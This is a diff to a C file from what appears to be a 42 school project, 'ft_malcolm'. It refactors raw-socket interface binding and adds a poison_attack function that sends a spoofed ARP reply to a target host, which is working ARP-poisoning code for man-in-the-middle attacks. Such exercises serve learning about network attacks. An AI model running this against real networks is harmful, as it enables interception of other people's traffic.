@@ -6,13 +6,14 @@
 /*   By: vgoncalv <vgoncalv@student.42sp.org.br>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/06/21 16:21:24 by vgoncalv          #+#    #+#             */
-/*   Updated: 2024/06/25 18:56:35 by vgoncalv         ###   ########.fr       */
+/*   Updated: 2024/06/26 08:00:42 by vgoncalv         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "ft_malcolm.h"
 #include <errno.h>
 #include <libft.h>
+#include <linux/if_packet.h>
 #include <net/if.h>
 #include <netinet/ether.h>
 #include <netinet/in.h>
@@ -43,9 +44,9 @@ int	poison_bind_interface(t_poison *poison)
 {
 	struct ifreq	req;
 
-	if (find_interface(poison->ifname) != 0)
+	if (find_interface(&poison->iface) != 0)
 		return (1);
-	printf("Found interface: %s\n", poison->ifname);
+	printf("Found interface: %s\n", poison->iface.name);
 	poison->sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 	if (poison->sock_fd == -1)
 	{
@@ -54,20 +55,20 @@ int	poison_bind_interface(t_poison *poison)
 	}
 	printf("Opened socket: %d\n", poison->sock_fd);
 	ft_bzero(&req, sizeof(struct ifreq));
-	ft_strlcpy(req.ifr_name, poison->ifname, IFNAMSIZ);
+	ft_strlcpy(req.ifr_name, poison->iface.name, IFNAMSIZ);
 	if (setsockopt(poison->sock_fd, SOL_SOCKET, SO_BINDTODEVICE, &req, sizeof(req)) == -1)
 	{
 		error("Failed to bind socket to interface: %s", strerror(errno));
 		return (1);
 	}
-	printf("Bound socket to the %s interface\n", poison->ifname);
+	printf("Bound socket to the %s interface\n", poison->iface.name);
 	return (0);
 }
 
 
 static int	is_poison_target(t_poison *poison, t_arp *packet)
 {
-	if (ft_memcmp(poison->target.mac, packet->ar_sha, 6) != 0)
+	if (ft_memcmp(poison->target.mac, packet->ar_sha, ETHER_ADDR_LEN) != 0)
 		return (0);
 	if (poison->target.ip != packet->ar_spa)
 		return (0);
@@ -97,4 +98,28 @@ int	poison_listen(t_poison *poison)
 			return (0);
 		}
 	}
+}
+
+int	poison_attack(t_poison *poison)
+{
+	int					res;
+	struct sockaddr_ll	addr;
+	t_arp				packet;
+
+	packet = create_arp_reply(&poison->source, &poison->target);
+	ft_bzero(&addr, sizeof(struct sockaddr_ll));
+	addr.sll_family = AF_PACKET;
+	addr.sll_ifindex = poison->iface.index;
+	addr.sll_halen = ETHER_ADDR_LEN;
+	addr.sll_protocol = htons(ETH_P_ARP);
+	ft_memcpy(addr.sll_addr, poison->target.mac, ETHER_ADDR_LEN);
+	res = sendto(poison->sock_fd, &packet, sizeof(t_arp), 0,
+			  (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
+	if (res == -1)
+	{
+		error("Failed to send ARP packet: %s", strerror(errno));
+		return (1);
+	}
+	printf("Sent spoofed ARP reply\n");
+	return (0);
 }
